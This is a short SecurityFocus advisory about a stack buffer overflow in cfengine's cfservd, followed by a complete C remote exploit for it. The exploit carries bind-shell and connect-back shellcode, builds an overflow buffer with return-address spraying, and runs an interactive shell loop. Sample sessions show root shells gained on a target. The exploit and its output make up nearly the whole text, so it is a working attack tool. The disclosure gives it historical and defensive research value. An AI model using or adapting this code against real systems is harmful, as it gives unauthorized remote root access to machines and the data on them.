source: http://www.securityfocus.com/bid/8699/info
 
cfengine is prone to a stack-based buffer overrun vulnerability. This issue may be exploited by remote attackers who can send malicious transaction packets to cfservd. This issue is due to insufficient bounds checking of data that is read in during a transaction with a remote user.
 
The vulnerability may be exploited to execute arbitrary code with the privileges of cfservd. A denial of service may also be the result of exploitation attempts as cfservd is multi-threaded and may not be configured to restart itself via a super-server such as inetd.

/*****************************************************************
 *                                                               *
 *  Author: snooq [http://www.angelfire.com/linux/snooq/]        *
 *  Date: 4 November 2003                                        *
 *                                                               *
 *  Yet another version.. no big deal.. nothing special..        *
 *  just an extra built-in support for 'connect-back' shell..    *
 *  so that I dun need 'nc -l -p 31337' stuffs... duh !?!        *
 *                                                               *
 *  Anyway.. credit should go to Nick Cleaton who disovered      *
 *  this nice little 'bug'... ;)                                 *
 *                                                               *
 *  As usual, use it at your very own risk...                    *
 *  But then again, I really doubt this code will work for you   *
 *  nicely out of the box. You still gotta find the rite offset  *
 *  for yourself... =p                                           *
 *                                                               *
 *  Greetz:                                                      *
 *  # jf, eugene, nam, wenbin...                                 *
 *  # airvirus (?!! I still dunno ur real name yet ?!)           *
 *                                                               *
 *****************************************************************/

/*
===================== cfservd under attack =======================

[root@pinoir tmp]# /usr/local/sbin/cfservd --debug --verbose
cfservd Debug mode: running in foreground

<snip>
......................
</snip>

*** New socket [5]
New connection...(from 192.168.1.2/5)
Spawning new thread...
Checking file updates on /var/cfengine/inputs/cfservd.conf 
(3fa74f2b/3fa77e9f)
RecvSocketStream(8)
    (Concatenated 8 from stream)
Transaction Receive [88888][]
RecvSocketStream(8888)
    (Concatenated 4192 from stream)
Transmission empty...
Received: ['\x90'......1???QQQ?f????PPfha,fS?SRQ???1??
1??1?R?f?????0?1??PW?f?????9?@1	?1????1???
1???1?h//shh/bin?PS??1??1	?? on socket -1869574000
Transaction Send[t 20][Packed text]
cfservd: Couldn't send
cfservd: send
cfservd: Closing connection

==================================================================
*/

/*
===================== sample attack 1 ============================

[snooq@arizona snooq]$ ./a.out -h 192.168.1.1

Cfservd Remote Exploit by snooq [ jinyean@hotmail.com ]
Tested to work against cfservd 2.0.7 on Redhat 8.0

-> Using return address of 0x4029eeff
-> 'Connecting' mode...
-> Exploit string sent. Waiting for a shell...
-> Connecting to shell at 192.168.1.1:24876
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),
4(adm),6(disk),10(wheel)
exit
-> Connection closed by remote host.
[snooq@arizona snooq]$

==================================================================
*/

/*
===================== sample attack 2 ============================

[snooq@arizona snooq]$ ./a.out -l -i 192.168.1.2 -h 192.168.1.1

Cfservd Remote Exploit by snooq [ jinyean@hotmail.com ]
Tested to work against cfservd 2.0.7 on Redhat 8.0

-> Using return address of 0x4029eeff
-> 'Listening' mode...( port: 24876 )
-> Exploit string sent....
-> Waiting for connection....
-> Connection from: 192.168.1.1
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),
4(adm),6(disk),10(wheel)
exit
[snooq@arizona snooq]$

==================================================================
*/

#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>

#define ALIGN		0	
#define HDR_SIZE	5	
#define TIME_OUT	10
#define HDR		0x38	// Anything between 1 ~ 9
#define NOP		0x90
#define T_PORT		5308
#define S_PORT		24876
#define RET_SIZE	400
#define BUFF_SIZE	4200
#define RET_ADDR	0x4029eeff

#define RET_OFFSET	0
#define IP_OFFSET	33
#define PORT_OFFSET_1 	35	// bind port shellcode
#define PORT_OFFSET_2 	39	// connect back shellcode
#define SC_SIZE_1	sizeof(bindport)
#define SC_SIZE_2	sizeof(connback)

#define CMD		"/usr/bin/id\n"

/* 
 *  Shellcode were shamelessly ripped from netric's code... =p
 */

char bindport[]=
	"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
	"\x06\x51\xb1\x01\x51\xb1\x02\x51"
	"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
	"\x89\xc1\x31\xc0\x31\xdb\x50\x50"
	"\x50\x66\x68\x61\x2c\xb3\x02\x66"
	"\x53\x89\xe2\xb3\x10\x53\xb3\x02"
	"\x52\x51\x89\xca\x89\xe1\xb0\x66"
	"\xcd\x80\x31\xdb\x39\xc3\x74\x05"
	"\x31\xc0\x40\xcd\x80\x31\xc0\x50"
	"\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
	"\x80\x89\xd7\x31\xc0\x31\xdb\x31"
	"\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
	"\x80\x31\xc0\x31\xdb\x50\x50\x57"
	"\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
	"\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
	"\xcd\x80\x39\xc3\x75\x40\x31\xc0"
	"\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
	"\x31\xc9\x89\xf3\xb0\x3f\xcd\x80"
	"\x31\xc0\x41\xb0\x3f\xcd\x80\x31"
	"\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
	"\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x8b\x54\x24"
	"\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
	"\x80\x31\xc0\x40\xcd\x80\x31\xc0"
	"\x89\xf3\xb0\x06\xcd\x80\xeb\x99";
	
char connback[]=
	"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
	"\x06\x51\xb1\x01\x51\xb1\x02\x51"
	"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
	"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
	"\x68\x41\x42\x43\x44\x66\x68\xb0"
	"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
	"\x10\x53\x57\x52\x89\xe1\xb3\x03"
	"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
	"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
	"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
	"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
	"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x50\x53\x89"
	"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
	"\x01\xcd\x80";

/*
 *  Ugly select() stuffs....
 *  Modified (a little) from TESO's code.. 
 *  to support connect back shell.... ;)
 */

void doshell(int sock) {
        int     l, sent;
        char    buf[512];
        fd_set  rfds;
	fd_set  wfds;

        while (1) {
                FD_SET (0, &rfds);
                FD_SET (sock, &rfds);
		FD_SET (sock, &wfds);

                select (sock + 1, &rfds, NULL, NULL, NULL);
                
		if (FD_ISSET (0, &rfds)) {
                        l = read (0, buf, sizeof (buf));
                        if (l <= 0) {
                                fprintf(stdout,"-> Connection closed by local user\n");
                                exit (EXIT_FAILURE);
                        }
			sent=0;
			while (!sent) {
				select (sock+1, NULL, &wfds, NULL, NULL);
				if (FD_ISSET(sock, &wfds)) {
					write(sock, buf, l);
					sent=1;
				}
			}
                }

                if (FD_ISSET (sock, &rfds)) {
                        l = read (sock, buf, sizeof (buf));
                        if (l == 0) {
                                fprintf(stdout,"-> Connection closed by remote host.\n");
                                exit (EXIT_FAILURE);
                        } else if (l < 0) {
                                fprintf(stdout,"-> read() error\n");
                                exit (EXIT_FAILURE);
                        }
                        write (1, buf, l);
                }
        }
}

void err_exit(char *s) {
	perror(s);
	exit(0);
}

void changeip(char *ip) {
	char *ptr;
	ptr=connback+IP_OFFSET;
	/* Assume Little-Endianess.... */
	*((long *)ptr)=inet_addr(ip);
}

void changeport(char *code, int port, int offset) {
	char *ptr;
	ptr=code+offset;
	/* Assume Little-Endianess.... */
	*ptr++=(char)((port>>8)&0xff);
	*ptr++=(char)(port&0xff);
}

void sendcmd(int sock) {
	if (send(sock,CMD,strlen(CMD),0)<0) {
		err_exit("-> send() error");
	}
}

void usage(char *s) {
	fprintf(stdout,"\nUsage: %s [-options]\n\n",s);
	fprintf(stdout,"\t-r\tSize of 'return addresses'\n");
	fprintf(stdout,"\t-b\tThe overall size of the buffer\n");
	fprintf(stdout,"\t-a\tAlignment size [0~3]\n");
	fprintf(stdout,"\t-t\tTarget's port\n");
	fprintf(stdout,"\t-s\tPort to bind shell to (in 'connecting' mode), or\n");
	fprintf(stdout,"\t\tPort for shell to connect back (in 'listening' mode)\n");
	fprintf(stdout,"\t-o\tOffset from the default return address\n");
	fprintf(stdout,"\t-h\tTarget's IP\n");
	fprintf(stdout,"\t-l\tListening for shell connecting\n");
	fprintf(stdout,"\t\tback to port specified by '-s' switch\n");
	fprintf(stdout,"\t-i\tIP for shell to connect back\n");
	fprintf(stdout,"\t-T\tNumber of seconds to wait for connection\n\n");
	fprintf(stdout,"\tNotes:\n\t======\n\t'-h' is mandatory\n");
	fprintf(stdout,"\t'-i' is mandatory if '-l' is specified\n\n");
	exit(0);
}

void sigalrm() {
	fprintf(stdout,"-> Nope.. I ain't waiting any longer.. =p\n");
	exit(0);
}

int main(int argc, char *argv[]) {

	char opt;
	char *buf, *ptr, *ip="";
	struct sockaddr_in sockadd;
	int i, s1, s2, i_len, ok=0, mode=0;
	int time_out=TIME_OUT, scsize=SC_SIZE_1;
	int s_port=S_PORT, t_port=T_PORT, offset=RET_OFFSET;
	int retsize=RET_SIZE, align=ALIGN, buffsize=BUFF_SIZE;
	long ret_addr;

	if (argc<2) { usage(argv[0]); }

	while ((opt=getopt(argc,argv,"i:r:b:a:h:t:s:o:T:l"))!=EOF) {
		switch(opt) {
			case 'i':
			ip=optarg;
			changeip(ip);
			break;

			case 'l':
			mode=1;
			scsize=SC_SIZE_2;
			break;
			
			case 'T':
			time_out=atoi(optarg);
			break;

			case 'b':
			buffsize=atoi(optarg);
			break;

			case 'a':
			align=atoi(optarg);
			break;

			case 'h':
			ok=1;
			sockadd.sin_addr.s_addr = inet_addr(optarg);
			break;

			case 'r':
			retsize=atoi(optarg);
			break;

			case 't':
			t_port=atoi(optarg);
			break;

			case 's':
			s_port=atoi(optarg);
			break;

			case 'o':
			offset=atoi(optarg);
			break;

			default:
			usage(argv[0]);
			break;
		}
	}

	if (!ok || (mode&&((strcmp(ip,"")==0)) ) ) { usage(argv[0]); }

	if (!(buf=malloc(buffsize+1))) {
		err_exit("-> malloc() error");
	}

	ret_addr=RET_ADDR-offset;
	fprintf(stdout,"\nCfservd Remote Exploit by snooq [ jinyean@hotmail.com ]\n");
	fprintf(stdout,"Tested to work against cfservd 2.0.7 on Redhat 8.0\n\n");
	fprintf(stdout,"-> Using return address of 0x%08x\n", ret_addr);

	ptr=buf;
	for(i=0;i<HDR_SIZE+align;i++) { *ptr++=HDR; }
	for(i=0;i<(buffsize-HDR_SIZE-align-scsize-retsize);i++) { *ptr++=NOP; }
	if (mode) {
	    	changeport(connback, s_port, PORT_OFFSET_2);
	    	for(i=0;i<scsize;i++) { *ptr++=connback[i]; }
	}
	else {
		changeport(bindport, s_port, PORT_OFFSET_1);
		for(i=0;i<scsize;i++) { *ptr++=bindport[i]; }
	}
	for(i=0;i<retsize;i+=4) {
		*((long *)ptr)=ret_addr;
		ptr+=4;
	}
	*ptr++=0;

	sockadd.sin_family = AF_INET;
	sockadd.sin_port = htons(t_port);

	if ((s1=socket(AF_INET,SOCK_STREAM,0))<0) {
		err_exit("-> socket error");
	}

	if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
		err_exit("-> connect() error");
	}

	if (mode) {

		fprintf(stdout,"-> 'Listening' mode...( port: %d )\n",s_port);

		if (fork()==0) {
			sleep(2);
			if (send(s1,buf,buffsize,0)<0) {
				err_exit("-> send() error");
			}
			fprintf(stdout,"-> Exploit string sent....\n");
			exit(0);
		}

		else {

			signal(SIGALRM,sigalrm);
			alarm(time_out);

			if ((s2=socket(AF_INET,SOCK_STREAM,0))<0) {
        			err_exit("-> socket error");
			}

			memset(&sockadd,0,sizeof(sockadd));
			sockadd.sin_family = AF_INET;
			sockadd.sin_port = htons(s_port);
			sockadd.sin_addr.s_addr = htonl(INADDR_ANY);
			i_len=sizeof(sockadd);

			if (bind(s2,(struct sockaddr *)&sockadd,i_len)<0) {
				err_exit("-> bind() error");
			}

			if (listen(s2,0)<0) {
				err_exit("-> listen() error");
			}

			wait();
			close(s1);
			fprintf(stdout,"-> Waiting for connection....\n");

			s1=accept(s2,(struct sockaddr *)&sockadd,&i_len);

			if (s1<0) {
				err_exit("-> accept() error");
			}

			alarm(0);

			fprintf(stdout,"-> Connection from: %s\n",inet_ntoa(sockadd.sin_addr));

			sendcmd(s1);
			doshell(s1);

		}

	}

	else {

		if (send(s1,buf,buffsize,0)<0) {
			err_exit("-> send() error");
		}

		close(s1);
		
		fprintf(stdout,"-> 'Connecting' mode...\n");
		fprintf(stdout,"-> Exploit string sent. Waiting for a shell...\n");
		sleep(2);

		sockadd.sin_family = AF_INET;
		sockadd.sin_port = htons(s_port);

		if ((s1=socket(AF_INET,SOCK_STREAM,0))<0) {
			err_exit("-> socket() error");
		}

		if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
        		fprintf(stdout,"-> Exploit failed. Target probably segfaulted...\n\n");
			exit(0);
		}
    
		fprintf(stdout,"-> Connecting to shell at %s:%d\n",inet_ntoa(sockadd.sin_addr),s_port);

		sendcmd(s1);
		doshell(s1);

	}

	return(0);
	
}